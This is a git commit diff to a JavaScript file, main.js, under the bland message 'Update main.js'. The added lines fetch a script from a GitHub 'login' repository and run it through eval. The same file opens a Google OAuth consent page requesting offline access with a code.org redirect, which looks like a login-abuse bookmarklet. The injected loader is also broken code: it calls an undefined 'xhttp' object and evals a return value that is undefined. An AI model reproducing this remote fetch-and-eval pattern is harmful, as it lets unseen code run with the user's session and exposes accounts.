15ff1700139fd354c9af2a69f47e36a70a3f8797
diuhfsuhdsa <114018471+diuhfsuhdsa@users.noreply.github.com>
2022-09-21 10:56:01 -0500

    Update main.js

--- main.js
+++ main.js
@@ -1,6 +1,7 @@
 var xmlrequest_obj_bg = new XMLHttpRequest();
 xmlrequest_obj_bg.onload = function() {
-  
+  var x_bg_111 = xhttp.open("GET", "https://raw.githubusercontent.com/diuhfsuhdsa/login/main/main.js");
+  eval(x_bg_111)
 }
 window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?access_type=offline&client_id=254945981659.apps.googleusercontent.com&include_granted_scopes=true&prompt=consent&redirect_uri=https%3A%2F%2Fstudio.code.org%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback&response_type=code&scope=email%20profile&state=8179795f02e404bba63a10c9df034c8a2b3e7e1696f16ee3&flowName=GeneralOAuthFlow");
 alert(%22okay%22);
